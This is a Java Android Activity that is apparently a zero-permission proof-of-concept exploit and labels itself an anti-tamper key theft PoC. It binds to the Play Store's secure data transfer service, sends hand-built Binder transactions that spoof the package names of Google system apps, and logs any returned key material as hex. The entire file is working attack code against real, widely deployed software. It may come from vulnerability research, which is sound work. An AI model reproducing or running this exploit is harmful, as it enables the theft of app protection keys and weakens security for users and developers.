package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

public class AntiTamperKeyStealActivity extends Activity {
    private static final String T = "ANTITAMPER";
    private static final String SERVICE_IFACE = "com.android.vending.securedatatransfer.IAntiTamperKeyTransferService";
    private static final String CALLBACK_IFACE = "com.android.vending.securedatatransfer.IAntiTamperKeyTransferResultListener";

    private IBinder serviceBinder;

    private final IBinder callbackBinder = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
            Log.w(T, "=== CALLBACK RECEIVED === code=" + code + " dataSize=" + data.dataSize() + " dataAvail=" + data.dataAvail());
            try {
                data.enforceInterface(CALLBACK_IFACE);
                Log.w(T, "Interface token validated, remaining=" + data.dataAvail());

                Bundle result = data.readBundle(getClassLoader());
                if (result != null) {
                    result.size(); // force unparcel
                    Log.w(T, "*** RESULT BUNDLE (size=" + result.size() + ") ***");
                    for (String key : result.keySet()) {
                        Object val = result.get(key);
                        Log.w(T, "  KEY: " + key + " TYPE: " + (val != null ? val.getClass().getName() : "null"));
                        if (val instanceof byte[]) {
                            byte[] bytes = (byte[]) val;
                            Log.w(T, "  *** KEY DATA LENGTH: " + bytes.length + " ***");
                            StringBuilder hex = new StringBuilder();
                            for (int i = 0; i < Math.min(bytes.length, 64); i++) {
                                hex.append(String.format("%02x", bytes[i]));
                            }
                            Log.w(T, "  KEY HEX (first 64 bytes): " + hex.toString());
                            Log.w(T, "  *** ANTI-TAMPER KEY OBTAINED! ***");
                        } else if (val instanceof android.app.PendingIntent) {
                            Log.w(T, "  PENDING_INTENT: " + val);
                        } else if (val != null) {
                            Log.w(T, "  VALUE: " + val.toString().substring(0, Math.min(200, val.toString().length())));
                        }
                    }
                    if (result.size() == 0) {
                        Log.w(T, "Bundle is EMPTY - service returned no data");
                    }
                } else {
                    Log.w(T, "Result bundle is NULL");
                }
            } catch (Exception e) {
                Log.e(T, "Callback parse error: " + e.getMessage());
            }
            // Always dump raw data for analysis
            data.setDataPosition(0);
            byte[] rawAll = data.marshall();
            StringBuilder hexAll = new StringBuilder();
            for (int idx = 0; idx < rawAll.length; idx++) {
                hexAll.append(String.format("%02x", rawAll[idx]));
                if ((idx + 1) % 4 == 0) hexAll.append(" ");
            }
            Log.w(T, "RAW PARCEL (" + rawAll.length + "): " + hexAll.toString());
            // Try reading after interface token manually
            data.setDataPosition(0);
            try {
                String iface = data.readString();
                Log.w(T, "IFACE: " + iface);
                int pos = data.dataPosition();
                Log.w(T, "After iface pos=" + pos + " avail=" + data.dataAvail());
                // Try reading as int first
                if (data.dataAvail() >= 4) {
                    int val1 = data.readInt();
                    Log.w(T, "INT1: " + val1 + " (0x" + Integer.toHexString(val1) + ")");
                }
                if (data.dataAvail() >= 4) {
                    int val2 = data.readInt();
                    Log.w(T, "INT2: " + val2 + " (0x" + Integer.toHexString(val2) + ")");
                }
            } catch (Exception ex) {
                Log.e(T, "Parse2 error: " + ex.getMessage());
            }
            return true;
        }
    };

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            Log.w(T, "*** SERVICE CONNECTED: " + name + " ***");
            serviceBinder = service;
            tryStealKey();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            Log.w(T, "Service disconnected: " + name);
            serviceBinder = null;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== ANTI-TAMPER KEY THEFT PoC ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());

        Intent serviceIntent = new Intent(SERVICE_IFACE);
        serviceIntent.setPackage("com.android.vending");
        try {
            boolean bound = bindService(serviceIntent, connection, Context.BIND_AUTO_CREATE);
            Log.w(T, "Bind result: " + bound);
            if (!bound) {
                Log.e(T, "Failed to bind to AntiTamperKeyTransferService");
            }
        } catch (Exception e) {
            Log.e(T, "Bind exception: " + e.getMessage());
        }
    }

    private void tryStealKey() {
        if (serviceBinder == null) {
            Log.e(T, "Service binder is null");
            return;
        }

        // Transaction 2 = method a(String packageName, int versionCode, ICallback callback)
        // Spoof package name as com.google.android.gms (system app, passes license check)
        String[] targetPackages = {
            "com.google.android.gms",
            "com.google.android.apps.maps",
            "com.google.android.youtube",
            "com.android.vending"
        };

        for (String targetPkg : targetPackages) {
            try {
                int versionCode = getPackageManager()
                    .getPackageInfo(targetPkg, 0).versionCode;
                Log.w(T, "Trying package: " + targetPkg + " version: " + versionCode);

                // Transaction 2 = method a(packageName, versionCode, callback)
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(SERVICE_IFACE);
                data.writeString(targetPkg);
                data.writeInt(versionCode);
                data.writeStrongBinder(callbackBinder);

                boolean result = serviceBinder.transact(2, data, reply, IBinder.FLAG_ONEWAY);
                Log.w(T, "Transaction result for " + targetPkg + ": " + result);

                data.recycle();
                reply.recycle();
            } catch (Exception e) {
                Log.e(T, "Error for " + targetPkg + ": " + e.getMessage());
            }
        }

        // Also try transaction 1 = method b(packageName, versionCode, wrappingKey, callback)
        try {
            String targetPkg = "com.google.android.gms";
            int versionCode = getPackageManager()
                .getPackageInfo(targetPkg, 0).versionCode;
            Log.w(T, "Trying with wrapping key for: " + targetPkg);

            Parcel data = Parcel.obtain();
            data.writeInterfaceToken(SERVICE_IFACE);
            data.writeString(targetPkg);
            data.writeInt(versionCode);
            // Provide a dummy wrapping key (32 bytes)
            byte[] dummyKey = new byte[32];
            for (int i = 0; i < 32; i++) dummyKey[i] = (byte)(i + 1);
            data.writeByteArray(dummyKey);
            data.writeStrongBinder(callbackBinder);

            boolean result = serviceBinder.transact(1, data, null, IBinder.FLAG_ONEWAY);
            Log.w(T, "Transaction 1 result: " + result);
            data.recycle();
        } catch (Exception e) {
            Log.e(T, "Error with wrapping key: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unbindService(connection);
        } catch (Exception e) {
            // ignore
        }
    }
}
